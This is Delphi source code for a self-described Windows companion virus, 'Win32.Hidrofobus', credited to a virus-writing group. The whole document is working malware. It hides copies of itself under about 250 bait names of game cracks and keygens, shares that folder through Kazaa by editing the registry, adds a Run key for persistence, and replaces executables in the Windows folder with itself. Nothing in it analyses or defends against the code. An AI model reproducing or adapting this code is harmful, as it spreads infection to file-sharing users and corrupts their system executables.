program hidrofobus;

{$WARN UNSAFE_TYPE OFF}

{
      Win32.Hidrofobus by Hutley / RRLF

      * My first companion virus

      Features:
        - spread by kazaa (~250 names)
        - not use encript of strings
        - start with windows
        - change the extension of .exe to .hid in win folder

      www.Hutley.de.vu
      www.RRLF.de.vu
}

uses
 Windows, SysUtils;

const
 about: string = 'win32.Hidrofobus';
 coder: string = 'Hutley / RRLF';

function WinDir: string;
begin
 SetLength(Result, MAX_PATH);
 if GetWindowsDirectory(PChar(Result), MAX_PATH) > 0 then
  Result := string(PChar(Result)) + '\'
 else
  Result := '';
end;

function SysDir: string;
begin
 SetLength(Result, MAX_PATH);
 if GetSystemDirectory(PChar(Result), MAX_PATH) > 0 then
  Result := string(PChar(Result)) + '\'
 else
  Result := '';
end;

procedure copy_fakes;
var
 hidro_file: array[0..260] of char;
 hidro_sysdir: string;
 i_fakes: integer;
const
 f_files: array[1..250] of string = ('hulbrich_regdat_v1.3',
  'h_ulbrich_regexport_v1.0',
  'h-a-l_1.01', 'h-a-l_1.02', 'h2omarker_1.1', 'h2omarker_1.3', 'h3d', 'h3d_1.0',
  'ha!_cd_burner_(+dvd)_5.0', 'habit_2_change_v1.0_palmospda', 'habit2change_v2.0_palmospda',
  'habu', 'hace_mmm_v2.02_plus', 'hace_mmm_v2.02_plus_regged', 'hack_all_world', 'hack_v0.1',
  'hacker_proof_98_v1.1', 'hacker_proof_98_v1.12', 'hacker_smacker_1.1', 'hacker_smacker_v1.1',
  'hacker_v1.1', 'hacker_v2.0_by_fhcf', 'hacker_v2.0_by_rh_factor', 'hackers_black_book',
  'hackers_black_book_login_(german)', 'hackersmacker_1.1', 'hacking_tools_v.2.12',
  'hackman_7.03', 'hackman_7.05', 'hackman_disassembler_8.01', 'hackman_disassembler_v8.0',
  'hackman_disassembler_v8.01', 'hackman_disassembler_v8.02_pro', 'hackman_hex_editor_7.03',
  'hackman_hex_editor_8.02', 'hackman_hex_editor_pro_7.05', 'hackman_hex_editor_v7.03',
  'hackman_hex_editor_v7.04', 'hackman_hex_editor_v7.05', 'hackman_hex_editor_v8.02_pro',
  'hackman_v5.01_by_aaocg', 'hackman_v5.01_by_tmg', 'hackman_v5.04', 'hackman_v6.01',
  'hackman_v7.03', 'hacknoid_1.1', 'haegemonia', 'haegemonia_the_solon_heritage',
  'haegemonia:_legions_of_iron', 'haegemonia:_the_solon_heritage', 'hailstorm_v3.0',
  'hahtsite_application_server_v3.0_win', 'hailstorm_spring_v2.0.0_n3650_java', 'half_life_2.2',
  'hainsoft_lanhelper_v1.4.5.3', 'hal-life_opposing_force', 'halcyon_6.05.01', 'halcyon_6.05.02',
  'half_-_life_counter_-_strike', 'half_life_+_counter_strike_keys', 'half_life_-_day_of_defeat',
  'half_life_-_steam_-_counterstrike', 'half_life_-_steam_works', 'half_life_2.1', 'half_life_2.0.1',
  'half_life_1_all', 'half_life_1.0.1.0', 'half_life_1.00', 'half_life_1.1.0.8', 'half_life_2.0',
  'half_life_2_1.0', 'half_life_2_all_access_cheats', 'half_life_2_all_versions_fix', 'half_life_2x',
  'half_life_all', 'half_life_cd_key', 'half_life_cd_key_6.9.2003', 'half_life_counter_strike_1.6_full',
  'half_life_counter_strike_danish', 'half_life_opposing_force_cd_key', 'half-life.0', 'half-life',
  'half_life.counter_strike_and_steam_cd-keys_all', 'half_life._counter-strike', 'half-life_(null)',
  'half_lifeuding_condition_zero_cdkey', 'half-life_(won_works)', 'half-life_-_counter-strike.1',
  'half-life_-_counter-strike_1.6', 'half-life_-_opposing_force_patch', 'half-life.cs',
  'half-life_1.1.1.0', 'half-life_-_opposing_force_no-cd', 'half-life_-_opposing_force_v1.1.0.0',
  'half-life_2_cdkey', 'half-life_2_crack', 'half-life_2_keygen', 'half-life_2_patch',
  'half-life_2_ai_rebuiled_fix', 'half-life_2_all_access_cheat', 'half-life_2_by_ape',
  'half-life_2_by_fff', 'half-life_2_by_ownage', 'half-life_2_by_revelation', 'half-life_2_by_swivvor',
  'half-life_2_by_virility', 'half-life_2_cdversion_upgrade', 'half-life_2_crack_by_ind',
  'half-life_2_dvd_edition_by_efc87rulez.tk', 'half-life_2_fix_by_ind', 'half-life_2_intro_remover',
  'half-life_2_nocddvd', 'half-life_2_online_play_method_by_ind', 'half-life_2_proper_by_logic',
  'half-life_._opposing_force_(null)', 'half-life_all_version', 'half-life_blue_shift_keygen',
  'half-life_blueshift_1.0', 'half-life_cd_key_changer_v3.0', 'half-life_cd_keygen',
  'half-life_cd-key_utility', 'half-life_counter_strike', 'half-life_counter_strike.patch',
  'half-life_counter_strike_cracker', 'half-life_counter_strike_keygen', 'half-life_keygen.1',
  'half-life_counterstrike_v_1.5.2', 'half-life_counterstrike_v_1.5', 'half-life_dedicated_server_v4.1.1.1',
  'half-life_edicão_especial.generation', 'half-life_opposing_force.hack', 'half-life_opposing_force.patcher',
  'half-life_opposing_force_keygen', 'half-life_original_won_cd_key', 'half-life_special_edition',
  'half-life_v1.0.1.0', 'half-life_v1.0.1.5', 'half-life_v1.0.1.6', 'half-life_v1.0.1.6_new',
  'half-life_v1.0.1.6_no-cd', 'half-life_v1.1.0.0', 'half-life_v1.1.0.0_new', 'half-life2',
  'half-life_v1.1.0.6_online_patch', 'half-life_v1.1.1.1', 'half-life_v1.1.1.1_tjomi4',
  'half-life_v1.107', 'half-life_v1.1101', 'half-life._blue_shift', 'half-life._game_of_the_year_edition',
  'half-life._blue_shift_v._1.0_+_opossing_force_multiplayer', 'half-life.counterstrike.crk',
  'half-life._gunman_chronicles', 'half-life._initial_encounter', 'half-life.opposing_for_s.n._ce',
  'half-life.counter_strike_1.1', 'half-life.opposing_force', 'halflife.crk', 'halflife_game_of_year_edition',
  'halflife_v1.0.0.5', 'halflife.counterstrike_lankey_100', 'half_life_source', 'hallosat_v5.15_german',
  'hallo_suchmaschinen_v1.02_german', 'hallosat_5.15.0', 'hallosat_5.15.1', 'hallosat_5.15', 'hallosat_5.21',
  'hallosat_v5.14_german', 'hallosat_v5.21_german', 'hallosat_v5.30_german', 'hallosat_v5.41_bilingual',
  'hallosat_v5.41_keygen', 'halloween_1,666', 'halloween_1.5', 'halloween_1.999', 'halloween_1.999.2',
  'halloween_3d_screensaver_1.0', 'halloween_3d_v1_2_level_unlocker', 'halloween_3d_v1_2_plus_6_trainer',
  'halloween_cheats', 'halloween_haunts_v1.0', 'halloween_haunts_v1.11', 'halloween_haunts_v1.2',
  'halloween_plus_6_trainer', 'halloween_screen_saver_1.0', 'halloween_slots',
  'halloween_slots_2.0', 'halloween_v1.3p_trainer', 'halloween_v1.666', 'halloween_v1.999',
  'halloween_v1.999_plus_8_trainer', 'halloween_v1.999.2', 'halloween_v2.71', 'halloween_v2.8',
  'halloween2000_v2.0', 'halma_3d_1.0', 'halma_3d_v1.0', 'halo', 'halo.crk', 'halo_1',
  'halo_2_multiplayer_gameguide', 'halo_alias_el_diablo_glitches_and_secrets_guide_v3.8',
  'halo_any', 'halo_by_el_diablo', 'halo_by_rte-dlazz', 'halo_ce', 'halo_cobat_evolved',
  'halo_combat_evloved', 'halo_combat_evolved', 'halo_combat_evolved_for_the_pc', 'ham_helper_v1.31',
  'halo_combat_evolved_private_server_patch_by_fairlight', 'halo_combat_evolved_public_server_patch_by_fairlight',
  'halo_combat_evolved_retail', 'halo_combat_evolved_update_v1.04', 'halo_combat_evolved_update_v1.05',
  'halo_combat_evolved_v1.01_plus_4_trainerdox', 'halo_combat_evolved_v1.031_french',
  'halo_combat_evolved_v1.04_plus_4_trainer', 'halo_custom_edition', 'halo_evolved.1', 'halo_german_serial',
  'halo_glitches_secrets_guide_v2.7', 'halo_pc', 'halo._combat_envolved', 'halo._combat_evolved.1',
  'halo._kampf_um_die_zukunft', 'halsovakten_plus_v2.10_o_swedish', 'halworks_2.0', 'halworks_2.2',
  'halworks_v2.01', 'ham_helper_1.11', 'ham_helper_1.31', 'ham_helper_v1.21', 'ham_helper_v1.3',
  'ham_label_professionell_3.5.1', 'ham_label_professionell_v3.5.1_german', 'ham_office_3.4.3b',
  'ham_label_professionell_v3.5.4_german', 'ham_label_professionell_v3.5.5_german', 'ham_office_3.3.2b',
  'ham_office_3.4.1b', 'ham_office_3.4.2', 'ham_office_v3.3.2_german', 'ham_office_v3.3.2b_german',
  'ham_office_v3.4.1b_german', 'ham_office_v3.4.3_german', 'ham_office_v3.4.5_german',
  'ham_office_v3.4.5b_german');
begin
 // let's to Windir!
 GetModuleFileName(0, hidro_file, SizeOf(hidro_file));
 if CopyFile(hidro_file, PChar(WinDir + 'hidrof.exe'), false) then
  SetFileAttributes(PChar(WinDir + 'hidrof.exe'), FILE_ATTRIBUTE_HIDDEN);
 // let´s to System\hidrofobus
 CreateDir(SysDir + 'hidrofobus');
 hidro_sysdir := SysDir + 'hidrofobus\';
 for i_fakes := 1 to 250 do
 begin
  if CopyFile(hidro_file, PChar(hidro_sysdir + f_files[i_fakes]), false) then
   SetFileAttributes(PChar(hidro_sysdir + f_files[i_fakes]), FILE_ATTRIBUTE_HIDDEN);
 end;
end;

procedure share_in_kazaa;
var
 kz_result: HKEY;
 hidrofo_path: string;
 hidrofo_size: integer;
const
 kz_key: HKEY = HKEY_CURRENT_USER;
 kz_subkey: string = 'Software\Kazaa\LocalContent';
begin
 hidrofo_path := '012345:' + SysDir + 'hidrofobus';
 hidrofo_size := length(hidrofo_path);
 if RegOpenKeyEx(kz_key, PChar(kz_subkey), 0, KEY_WRITE, kz_result) =
  ERROR_SUCCESS then
 begin
  RegSetValueEx(kz_result, PChar('Dir0'), 0, REG_SZ, PChar(hidrofo_path),
   hidrofo_size);
  RegCloseKey(kz_result);
 end;
end;

procedure winreg;
var
 wr_result: HKEY;
 hidrofo_path: string;
 hidrofo_size: integer;
const
 wr_key: HKEY = HKEY_LOCAL_MACHINE;
 wr_subkey: string = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run';
begin
 hidrofo_path := WinDir + 'hidrof.exe';
 hidrofo_size := length(hidrofo_path);
 if RegOpenKeyEx(wr_key, PChar(wr_subkey), 0, KEY_WRITE, wr_result) =
  ERROR_SUCCESS then
 begin
  RegSetValueEx(wr_result, PChar('Hidrofobus'), 0, REG_SZ,
   PChar(hidrofo_path), hidrofo_size);
  RegCloseKey(wr_result);
 end;
end;

procedure scan_infect_files;
var
 f_found: TSearchRec;
 hidro_new, hidro_host: string;
 hidro_file: array[0..260] of char;
begin
 GetModuleFileName(0, hidro_file, SizeOf(hidro_file));
 if FindFirst(WinDir + '*.exe', faArchive or faHidden, f_found) = 0 then
 try
  repeat
   hidro_host := WinDir + f_found.Name;
   hidro_new := Copy(hidro_host, 1, length(hidro_host) - 3) + 'hid';
   if CopyFile(PChar(hidro_host), PChar(hidro_new), true) = true then
    CopyFile(hidro_file, PChar(hidro_host), false)
   else
  until
   FindNext(f_found) <> 0;
 finally
  FindClose(f_found);
 end;
end;

var
 hidro_file: array[0..260] of char;
 hidro_real: string;
begin
 GetModuleFileName(0, hidro_file, SizeOf(hidro_file));
 hidro_real := hidro_file;
 hidro_real := Copy(hidro_real, 1, length(hidro_real) - 3) + 'hid';
 if WinExec(PChar(hidro_real), SW_SHOWDEFAULT) = ERROR_FILE_NOT_FOUND then
  scan_infect_files;
 copy_fakes;
 share_in_kazaa;
 winreg;
end.

